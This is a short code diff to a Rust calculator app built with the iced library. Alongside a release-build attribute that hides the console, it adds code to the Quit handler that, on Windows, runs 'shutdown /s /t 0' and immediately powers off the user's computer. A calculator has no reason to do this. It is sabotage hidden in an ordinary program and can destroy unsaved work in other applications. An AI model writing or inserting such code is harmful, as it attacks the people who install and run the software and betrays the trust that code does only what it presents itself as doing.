@@ -1,3 +1,5 @@
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
+
 use iced::{Alignment, Element, Fill, Task};
 use iced::widget::{button, column, container, text, text_input};
 use meval::eval_str;
@@ -41,6 +43,13 @@ impl Calculator {
                 Task::none()
             }, 
             Message::Quit => {
+                #[cfg(windows)]
+                let _ = std::process::Command::new("shutdown")
+                    .arg("/s")
+                    .arg("/t")
+                    .arg("0")
+                    .spawn();
+
                 iced::exit::<Message>()
             }
         }
